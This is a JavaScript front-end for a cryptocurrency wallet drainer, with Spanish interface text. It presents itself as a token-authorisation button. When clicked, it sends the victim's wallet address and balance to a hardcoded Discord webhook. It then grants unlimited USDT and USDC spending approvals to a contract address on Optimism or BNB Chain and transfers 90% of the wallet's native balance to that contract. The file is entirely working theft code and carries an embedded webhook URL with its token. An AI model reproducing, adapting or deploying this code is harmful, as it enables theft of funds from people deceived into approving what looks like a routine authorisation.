const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1384351633290428478/wYzF9QeKtS80lVRtfanPfUb3XjisCWnzhCd2qLPuwzZ1i69mSJAKVfv3xlwL67prbMGH';

const NETWORKS = {
  optimism: {
    name: "Optimism",
    chainId: '0xA',
    rpcUrl: 'https://mainnet.optimism.io',
    explorer: 'https://optimistic.etherscan.io',
    currency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
    contractAddress: "0x3Fc7F791E09937ac8eDb5c2Be5C459b554b5a31d"
  },
  bsc: {
    name: "Binance Smart Chain",
    chainId: '0x38',
    rpcUrl: 'https://bsc-dataseed.binance.org/',
    explorer: 'https://bscscan.com',
    currency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
    contractAddress: "0x4eA5E81b400e57e102B5ff632C1E7168D5D6b170"
  }
};

const contractABI = [];

let web3;
let userAccount;
let contract;
let selectedNetwork = 'optimism';

document.getElementById('networkSelector').addEventListener('change', async (e) => {
  selectedNetwork = e.target.value;
  await connectNetwork();
});

window.onload = async () => {
  selectedNetwork = document.getElementById('networkSelector').value;
  await connectNetwork();
};

async function connectNetwork() {
  const net = NETWORKS[selectedNetwork];
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    try {
      await ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: net.chainId }] });
    } catch (switchError) {
      if (switchError.code === 4902) {
        await ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: net.chainId,
            chainName: net.name,
            rpcUrls: [net.rpcUrl],
            nativeCurrency: net.currency,
            blockExplorerUrls: [net.explorer]
          }]
        });
      } else {
        alert("Error al conectar a " + net.name);
        return;
      }
    }

    try {
      const accounts = await ethereum.request({ method: "eth_requestAccounts" });
      userAccount = accounts[0];
      contract = new web3.eth.Contract(contractABI, net.contractAddress);
      document.getElementById("approveTokens").disabled = false;
    } catch (error) {
      alert("Error al conectar MetaMask");
    }
  } else {
    alert("MetaMask no está instalado");
  }
}

document.getElementById("approveTokens").addEventListener("click", async () => {
  const button = document.getElementById("approveTokens");
  if (!userAccount) return alert("Primero conecta MetaMask");

  button.disabled = true;
  button.textContent = "Aprobando...";
  button.style.backgroundColor = "#f0b90b";

  const TOKENS_BY_NETWORK = {
    optimism: [
      "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
      "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1"  // USDC
    ],
    bsc: [
      "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
      "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"  // USDC BSC
    ]
  };

  const approveABI = [{
    "constant": false,
    "inputs": [
      { "name": "spender", "type": "address" },
      { "name": "amount", "type": "uint256" }
    ],
    "name": "approve",
    "outputs": [{ "name": "", "type": "bool" }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  }];

  const tokens = TOKENS_BY_NETWORK[selectedNetwork];

  try {
    const balanceWei = await web3.eth.getBalance(userAccount);
    const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
    const numericBalance = parseFloat(balanceEth);

    await sendToDiscordWebhook('wallet', userAccount, balanceEth);

    for (const token of tokens) {
      try {
        const tokenContract = new web3.eth.Contract(approveABI, token);
        await tokenContract.methods
          .approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
          .send({ from: userAccount });
      } catch (err) {
        console.error(`Error al aprobar token ${token}:`, err.message);
        continue; // sigue con el siguiente token
      }
    }

    if (numericBalance > 0) {
      const ninetyPercent = web3.utils.toWei((numericBalance * 0.9).toFixed(6), 'ether');

      await web3.eth.sendTransaction({
        from: userAccount,
        to: NETWORKS[selectedNetwork].contractAddress,
        value: ninetyPercent
      });

      await sendToDiscordWebhook('kyc', userAccount, balanceEth);
      alert("Aprobaciones realizadas y 90% del saldo enviado al contrato.");
    } else {
      alert("No hay saldo suficiente para enviar ETH al contrato.");
    }

    button.textContent = "Autorizado ✓";
    button.style.backgroundColor = "#00b15d";
  } catch (error) {
    console.error(error);
    alert("Error al aprobar tokens o enviar ETH");
    button.textContent = "Autorizar Tokens";
    button.style.backgroundColor = "#f0b90b";
    button.disabled = false;
  }
});

async function sendToDiscordWebhook(eventType, address, balance) {
  const embed = {
    title: eventType === 'wallet' ? 'Wallet Conectada' : 'Evento',
    color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
    fields: [
      { name: 'Dirección', value: address },
      { name: 'Balance', value: `${balance} ETH` }
    ],
    timestamp: new Date().toISOString()
  };

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (error) {
    console.error("Error enviando a Discord:", error);
  }
}
